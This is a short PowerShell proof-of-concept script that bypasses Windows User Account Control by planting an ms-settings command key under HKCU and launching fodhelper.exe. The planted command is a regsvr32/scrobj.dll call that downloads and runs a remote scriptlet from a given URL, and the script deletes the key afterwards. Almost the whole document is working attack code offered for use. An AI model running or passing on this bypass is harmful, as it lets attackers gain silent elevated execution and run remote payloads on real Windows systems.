<#
.SYNOPSIS
	This script is a proof of concept to bypass the User Access Control (UAC) via fodhelper.exe

	It creates a new registry structure in: "HKCU:\Software\Classes\ms-settings\" to perform an UAC bypass to start any application.

	ATTENTION: Do not try this on your productive machine!


.NOTES
	Function   : FodhelperBypass
	File Name  : FodhelperBypass.ps1
	Author     : Christian B. - winscripting.blog


.LINK

	https://github.com/winscripting/UAC-bypass

.EXAMPLE

	Load "regsvr32 -s -n -u -i:http://192.168.0.10/runner.cst scrobj.dll":
	FodhelperBypass -http "http://192.168.0.10/runner.cst"


#>

function FodhelperBypass(){
	Param (
	
		[String]$http
	)
	
	$program = "regsvr32 -s -n -u -i:$http scrobj.dll"

	#Create registry structure
	New-Item "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force
	New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force
	Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value $program -Force

	#Perform the bypass
		#In Windows execution
		#Start-Process "C:\Windows\System32\fodhelper.exe" -WindowStyle Hidden

		#Remote execution
		C:\Windows\Sysnative\cmd.exe /c C:\Windows\System32\fodhelper.exe

	#Remove registry structure
	Start-Sleep 3
	Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
	
}
